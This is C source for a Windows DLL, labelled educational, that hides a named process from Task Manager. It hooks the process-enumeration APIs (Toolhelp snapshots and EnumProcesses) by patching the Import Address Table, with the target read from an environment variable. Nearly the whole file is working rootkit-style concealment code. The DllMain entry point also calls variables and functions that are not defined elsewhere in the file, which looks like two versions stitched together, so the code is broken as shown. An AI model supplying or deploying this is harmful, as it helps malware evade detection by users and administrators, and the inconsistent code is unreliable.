/**
 * Windows Process Hiding Library - Educational Purpose Only
 * 
 * Advanced version with multiple hook points and comprehensive logging
 */

#include <windows.h>
#include <tlhelp32.h>
#include <psapi.h>

// Global variables for the target process
static WCHAR g_szTargetProcess[MAX_PATH] = {0};
static DWORD g_dwTargetPID = 0;

// Original API function pointers
typedef HANDLE (WINAPI *CreateToolhelp32Snapshot_t)(DWORD, DWORD);
typedef BOOL (WINAPI *Process32FirstW_t)(HANDLE, LPPROCESSENTRY32W);
typedef BOOL (WINAPI *Process32NextW_t)(HANDLE, LPPROCESSENTRY32W);
typedef BOOL (WINAPI *EnumProcesses_t)(DWORD*, DWORD, LPDWORD);

static CreateToolhelp32Snapshot_t Real_CreateToolhelp32Snapshot = NULL;
static Process32FirstW_t Real_Process32FirstW = NULL;
static Process32NextW_t Real_Process32NextW = NULL;
static EnumProcesses_t Real_EnumProcesses = NULL;

// Logging function
void LogToFile(LPCWSTR message) {
    HANDLE hFile = CreateFileW(L"C:\\process_hider_log.txt", 
        GENERIC_WRITE, FILE_SHARE_READ, NULL, OPEN_ALWAYS, 
        FILE_ATTRIBUTE_NORMAL, NULL);
    
    if (hFile != INVALID_HANDLE_VALUE) {
        SetFilePointer(hFile, 0, NULL, FILE_END);
        DWORD written;
        WriteFile(hFile, message, (DWORD)(wcslen(message) * sizeof(WCHAR)), &written, NULL);
        WriteFile(hFile, L"\r\n", 4, &written, NULL);
        CloseHandle(hFile);
    }
}

// Get PID from process name
DWORD GetProcessPID(LPCWSTR processName) {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return 0;
    
    PROCESSENTRY32W pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32W);
    
    if (Process32FirstW(hSnapshot, &pe32)) {
        do {
            if (_wcsicmp(pe32.szExeFile, processName) == 0) {
                CloseHandle(hSnapshot);
                return pe32.th32ProcessID;
            }
        } while (Process32NextW(hSnapshot, &pe32));
    }
    
    CloseHandle(hSnapshot);
    return 0;
}

// Hooked CreateToolhelp32Snapshot - intercept process snapshots
HANDLE WINAPI Hook_CreateToolhelp32Snapshot(DWORD dwFlags, DWORD th32ProcessID) {
    LogToFile(L"CreateToolhelp32Snapshot called");
    
    if (!Real_CreateToolhelp32Snapshot) {
        Real_CreateToolhelp32Snapshot = (CreateToolhelp32Snapshot_t)
            GetProcAddress(GetModuleHandleW(L"kernel32.dll"), "CreateToolhelp32Snapshot");
    }
    
    return Real_CreateToolhelp32Snapshot(dwFlags, th32ProcessID);
}

// Hooked Process32FirstW - skip target process
BOOL WINAPI Hook_Process32FirstW(HANDLE hSnapshot, LPPROCESSENTRY32W lppe) {
    if (!Real_Process32FirstW) {
        Real_Process32FirstW = (Process32FirstW_t)
            GetProcAddress(GetModuleHandleW(L"kernel32.dll"), "Process32FirstW");
    }
    
    BOOL result = Real_Process32FirstW(hSnapshot, lppe);
    
    // Skip target process
    while (result && g_szTargetProcess[0] != L'\0') {
        if (_wcsicmp(lppe->szExeFile, g_szTargetProcess) == 0 || 
            lppe->th32ProcessID == g_dwTargetPID) {
            
            LogToFile(L"Hiding target process in Process32FirstW");
            result = Process32NextW(hSnapshot, lppe);
        } else {
            break;
        }
    }
    
    return result;
}

// Hooked Process32NextW - skip target process
BOOL WINAPI Hook_Process32NextW(HANDLE hSnapshot, LPPROCESSENTRY32W lppe) {
    if (!Real_Process32NextW) {
        Real_Process32NextW = (Process32NextW_t)
            GetProcAddress(GetModuleHandleW(L"kernel32.dll"), "Process32NextW");
    }
    
    BOOL result;
    
    do {
        result = Real_Process32NextW(hSnapshot, lppe);
        if (!result) break;
        
        // Skip target process
        if (g_szTargetProcess[0] != L'\0' && 
            (_wcsicmp(lppe->szExeFile, g_szTargetProcess) == 0 || 
             lppe->th32ProcessID == g_dwTargetPID)) {
            
            LogToFile(L"Hiding target process in Process32NextW");
            continue;
        }
        
        break;
    } while (result);
    
    return result;
}

// Hooked EnumProcesses - filter out target process
BOOL WINAPI Hook_EnumProcesses(DWORD* lpidProcess, DWORD cb, LPDWORD lpcbNeeded) {
    if (!Real_EnumProcesses) {
        Real_EnumProcesses = (EnumProcesses_t)
            GetProcAddress(GetModuleHandleW(L"psapi.dll"), "EnumProcesses");
        if (!Real_EnumProcesses) {
            Real_EnumProcesses = (EnumProcesses_t)
                GetProcAddress(GetModuleHandleW(L"kernel32.dll"), "K32EnumProcesses");
        }
    }
    
    BOOL result = Real_EnumProcesses(lpidProcess, cb, lpcbNeeded);
    
    if (result && g_dwTargetPID != 0 && lpidProcess && lpcbNeeded) {
        DWORD count = *lpcbNeeded / sizeof(DWORD);
        DWORD newCount = 0;
        
        // Filter out target process
        for (DWORD i = 0; i < count; i++) {
            if (lpidProcess[i] != g_dwTargetPID) {
                lpidProcess[newCount++] = lpidProcess[i];
            }
        }
        
        *lpcbNeeded = newCount * sizeof(DWORD);
        LogToFile(L"Filtered target process from EnumProcesses");
    }
    
    return result;
}

// Advanced IAT hooking
BOOL HookImportAddressTable(HMODULE hModule, LPCSTR szLibraryName, LPCSTR szFunctionName, LPVOID pNewFunction) {
    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)hModule;
    if (pDosHeader->e_magic != IMAGE_DOS_SIGNATURE) return FALSE;
    
    PIMAGE_NT_HEADERS pNTHeaders = (PIMAGE_NT_HEADERS)((LPBYTE)hModule + pDosHeader->e_lfanew);
    if (pNTHeaders->Signature != IMAGE_NT_SIGNATURE) return FALSE;
    
    PIMAGE_IMPORT_DESCRIPTOR pImportDesc = (PIMAGE_IMPORT_DESCRIPTOR)((LPBYTE)hModule + 
        pNTHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);
    
    if (!pImportDesc) return FALSE;
    
    while (pImportDesc->Name) {
        LPSTR pszLibraryName = (LPSTR)((LPBYTE)hModule + pImportDesc->Name);
        
        if (_stricmp(pszLibraryName, szLibraryName) == 0) {
            PIMAGE_THUNK_DATA pThunk = (PIMAGE_THUNK_DATA)((LPBYTE)hModule + pImportDesc->FirstThunk);
            PIMAGE_THUNK_DATA pOrigThunk = (PIMAGE_THUNK_DATA)((LPBYTE)hModule + pImportDesc->OriginalFirstThunk);
            
            while (pThunk->u1.Function && pOrigThunk->u1.Ordinal) {
                if (!(pOrigThunk->u1.Ordinal & IMAGE_ORDINAL_FLAG)) {
                    PIMAGE_IMPORT_BY_NAME pImportByName = (PIMAGE_IMPORT_BY_NAME)((LPBYTE)hModule + pOrigThunk->u1.AddressOfData);
                    
                    if (strcmp((LPCSTR)pImportByName->Name, szFunctionName) == 0) {
                        DWORD dwOldProtect;
                        if (VirtualProtect(&pThunk->u1.Function, sizeof(LPVOID), PAGE_READWRITE, &dwOldProtect)) {
                            pThunk->u1.Function = (DWORD_PTR)pNewFunction;
                            VirtualProtect(&pThunk->u1.Function, sizeof(LPVOID), dwOldProtect, &dwOldProtect);
                            return TRUE;
                        }
                    }
                }
                pThunk++;
                pOrigThunk++;
            }
        }
        pImportDesc++;
    }
    
    return FALSE;
}

// Install hooks in the target process
void InstallProcessHooks() {
    HMODULE hTargetModule = GetModuleHandleW(NULL); // Current process (taskmgr.exe)
    
    if (hTargetModule) {
        LogToFile(L"Installing IAT hooks...");
        
        // Hook kernel32 functions
        HookImportAddressTable(hTargetModule, "kernel32.dll", "CreateToolhelp32Snapshot", Hook_CreateToolhelp32Snapshot);
        HookImportAddressTable(hTargetModule, "kernel32.dll", "Process32FirstW", Hook_Process32FirstW);
        HookImportAddressTable(hTargetModule, "kernel32.dll", "Process32NextW", Hook_Process32NextW);
        
        // Hook psapi functions (used by newer Task Manager)
        HookImportAddressTable(hTargetModule, "psapi.dll", "EnumProcesses", Hook_EnumProcesses);
        HookImportAddressTable(hTargetModule, "kernel32.dll", "K32EnumProcesses", Hook_EnumProcesses);
        
        LogToFile(L"Hooks installed successfully");
    }
}

// DLL Entry Point
BOOL APIENTRY DllMain(HMODULE hModule, DWORD dwReason, LPVOID lpReserved) {
    switch (dwReason) {
        case DLL_PROCESS_ATTACH: {
            // Get target process from environment variable
            CHAR envBuffer[MAX_PATH];
            DWORD result = GetEnvironmentVariableA("TARGET_PROCESS", envBuffer, MAX_PATH);
            
            if (result > 0 && result < MAX_PATH) {
                // Convert to wide string
                MultiByteToWideChar(CP_ACP, 0, envBuffer, -1, g_targetProcess, MAX_PATH);
                
                // Get PID of target process
                g_targetPID = GetPIDFromProcessName(g_targetProcess);
                
                // Log to a file for debugging
                HANDLE hLogFile = CreateFileW(L"C:\\process_hider_debug.txt", 
                    GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, 
                    FILE_ATTRIBUTE_NORMAL, NULL);
                if (hLogFile != INVALID_HANDLE_VALUE) {
                    WCHAR logMsg[256];
                    swprintf_s(logMsg, 256, L"DLL loaded. Target: %ls, PID: %lu\r\n", 
                        g_targetProcess, g_targetPID);
                    DWORD written;
                    WriteFile(hLogFile, logMsg, (DWORD)(wcslen(logMsg) * sizeof(WCHAR)), &written, NULL);
                    CloseHandle(hLogFile);
                }
                
                // Patch IAT for current module (taskmgr.exe)
                HMODULE hCurrentModule = GetModuleHandleW(NULL);
                if (hCurrentModule) {
                    PatchIAT(hCurrentModule, "kernel32.dll", "Process32FirstW", HookedProcess32FirstW);
                    PatchIAT(hCurrentModule, "kernel32.dll", "Process32NextW", HookedProcess32NextW);
                }
            }
            break;
        }
        
        case DLL_PROCESS_DETACH:
            // Cleanup if needed
            break;
    }
    
    return TRUE;
}
